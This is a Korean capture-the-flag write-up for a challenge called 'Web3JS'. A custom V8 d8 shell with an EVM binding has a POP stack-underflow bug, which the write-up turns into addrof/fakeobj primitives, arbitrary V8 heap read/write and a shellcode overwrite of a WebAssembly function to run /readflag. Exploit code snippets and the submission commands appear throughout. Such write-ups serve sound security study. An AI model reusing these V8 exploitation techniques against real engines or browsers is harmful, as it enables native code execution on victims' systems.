# Web3JS Writeup

## 문제 개요

문제 서버는 커스텀 `d8` 바이너리를 실행한다. 이 `d8`에는 작은 EVM 바인딩이 추가되어 있다.

```js
const vm = evm("600160020100");
vm.run();
vm.stack(1);
```

원격 서비스는 클라이언트가 보낸 base64 한 줄을 `run.js`로 디코딩한 뒤 `/opt/chal/d8`로 실행한다.

```sh
(base64 -w0 exploit.js; echo) | nc nhnc2.whale-tw.com 10002
```

실제 플래그는 root만 읽을 수 있는 `/flag.txt`에 있고, setuid helper인 `/readflag`를 실행해야 출력된다. 따라서 목표는 `d8` 내부에서 네이티브 코드 실행을 얻는 것이다.

## 취약점

커스텀 EVM 런타임은 내부 고정 배열에 `EvmWord` 스택을 저장한다. 문제는 `POP` opcode, 즉 `0x50` 처리에 있다.

빈 스택에서 `POP`을 실행하면 에러 상태를 설정하지만, unsigned stack depth를 그대로 감소시킨다.

```text
depth: 0 -> 0xffffffffffffffff
```

아래 코드로 바로 확인할 수 있다.

```js
let vm = evm("50");
vm.run();
print(JSON.stringify(vm.status()));
```

이후 `vm.push()`도 안전하지 않다. 스택 limit 검사가 `depth == 0x400`인 경우만 막기 때문에, 언더플로된 depth는 검사를 우회하고 실제 스택 버퍼 앞쪽에 OOB write를 수행한다.

## Primitive 구성

런타임 내부 배치는 exploit에 유리하다.

```text
EvmRuntime + 0x160       EVM memory buffer
EvmRuntime + 0x10160     EVM stack buffer
```

스택 앞쪽으로 OOB 접근을 만들면 EVM memory 영역을 `EvmWord` 스택 엔트리처럼 해석하게 만들 수 있다.

`EvmWord`는 크게 두 형태로 사용된다.

```text
tag = 0: 256-bit integer, hex string으로 반환
tag = 1: raw V8 value handle, JS object로 반환
```

이를 이용해 V8 exploit에 필요한 `addrof`와 `fakeobj`를 만든다.

### addrof

JS 객체를 EVM 스택에 push한 뒤 `MSTORE`로 EVM memory에 저장한다. 이후 `vm.memory()`로 raw tagged pointer를 읽는다.

```js
function addrof(o) {
  const vm = evm("52"); // MSTORE
  vm.push(o);
  vm.push(0);
  vm.step();
  const h = vm.memory(0, 32).slice(2);
  return BigInt("0x" + h.slice(48, 64));
}
```

### fakeobj

EVM memory에 `EvmWord(tag=1, value=ptr)` 형태의 가짜 엔트리를 심는다. 그 다음 `POP`을 반복 실행해 언더플로된 stack base가 이 가짜 엔트리를 가리키게 만들고, `vm.get(0)`으로 JS 객체처럼 반환받는다.

```js
function fakeobj(ptr) {
  const vm = evm("60286000601037" + "50".repeat(1637));
  vm.input(hex64le(1n) + hex64le(ptr) + "00".repeat(24));
  vm.run();
  return vm.get(0);
}
```

여기서 `1637`은 언더플로된 스택 위치를 EVM memory 안의 fake word에 맞추기 위한 값이다.

## V8 AAR/AAW

`addrof`와 `fakeobj`가 있으면 fake `JSArray`를 만들 수 있다. exploit은 정상 double array를 저장 공간으로 사용하고, 그 안에 fake array object와 fake elements를 배치한다.

```text
fake JSArray:
  map        = PACKED_DOUBLE_ELEMENTS JSArray map, low32 = 0x0100d30d
  properties = empty FixedArray, low32 = 0x000007e5
  elements   = controlled fake elements pointer
  length     = large SMI
```

fake array의 `elements` 포인터를 바꾸면 원하는 주소를 double element처럼 읽고 쓸 수 있다.

```js
function read64(addr) {
  setElements(addr);
  return ftoi(aarw[0]);
}

function write64(addr, val) {
  setElements(addr);
  aarw[0] = itof(val);
}
```

이 단계에서 V8 heap에 대한 64-bit arbitrary read/write가 완성된다.

## 코드 실행

최종 단계는 `ArrayBuffer.backing_store`를 악용한다.

`JSArrayBuffer` 객체 안의 backing store 포인터는 `+0x24`에 있었다.

```text
JSArrayBuffer + 0x24: backing_store
```

exploit은 작은 WebAssembly 함수를 만든 뒤, wasm export 함수의 메타데이터를 따라가 네이티브 코드 엔트리 주소를 찾는다.

```text
JSFunction + 0x10                  -> SharedFunctionInfo
SharedFunctionInfo data            -> Wasm export function data
Wasm export function data + 0x10   -> Wasm trusted instance data
Wasm trusted instance data + 0x28  -> native code entry
```

그 다음 새 `ArrayBuffer`의 backing store를 이 native code 주소로 바꾼다. 이제 `DataView` write가 곧 native code overwrite가 된다.

덮어쓴 shellcode는 다음을 실행한다.

```text
execve("/readflag", NULL, NULL)
```

마지막으로 wasm export 함수를 호출하면 overwrite한 shellcode가 실행되고 `/readflag`가 플래그를 출력한다.

## Exploit

최종 exploit 파일:

```text
dist/exploit.js
```

로컬 Docker 환경 실행:

```sh
cd Web3JS/dist
docker compose up -d --build
(base64 -w0 exploit.js; echo) | nc localhost 5000
```

원격 서버 실행:

```sh
cd Web3JS/dist
(base64 -w0 exploit.js; echo) | nc nhnc2.whale-tw.com 10002
```

## 결과

원격 서버 출력:

```text
Send your base64-encoded d8 script on a single line:
running...
NHNC{your_smart_contract_is_too_smart_so_it_escaped_lol}
```

